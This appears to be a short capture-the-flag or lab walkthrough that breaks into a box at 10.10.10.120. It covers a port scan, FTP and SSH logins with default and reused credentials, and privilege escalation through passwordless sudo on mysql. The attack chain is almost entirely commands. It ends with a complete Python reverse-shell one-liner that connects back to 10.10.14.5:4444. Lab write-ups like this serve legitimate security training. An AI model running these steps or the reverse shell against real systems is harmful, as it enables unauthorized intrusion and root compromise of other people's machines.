Multiple services all using default credentials.

### Initial Recon

```
# Full nmap scan
nmap -p- -sV 10.10.10.120

# Open ports:
# 21/tcp   ftp     vsftpd 2.3.4
# 22/tcp   ssh     OpenSSH 7.2p2
# 80/tcp   http    Apache httpd 2.4.18
# 3306/tcp mysql   MySQL 5.7.33
# 5432/tcp postgresql PostgreSQL 9.6
# 27017/tcp mongodb MongoDB 4.0
```

#### FTP Default Creds
```
# vsftpd 2.3.4 backdoor
# But first try default creds
ftp 10.10.10.120
Username: admin
Password: admin
# Login successful!

# Download all files
mget *

# Found: note.txt
# "SSH password is the same as FTP for user 'backup'"
```

#### SSH Access
```
# SSH as backup
ssh backup@10.10.10.120
# password: admin

# Check sudo
sudo -l
# (ALL) NOPASSWD: /usr/bin/mysql
```

#### MySQL Privesc
```
# MySQL as root (sudo)
sudo mysql

# In MySQL
\! whoami
# root

# Get reverse shell
\! python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

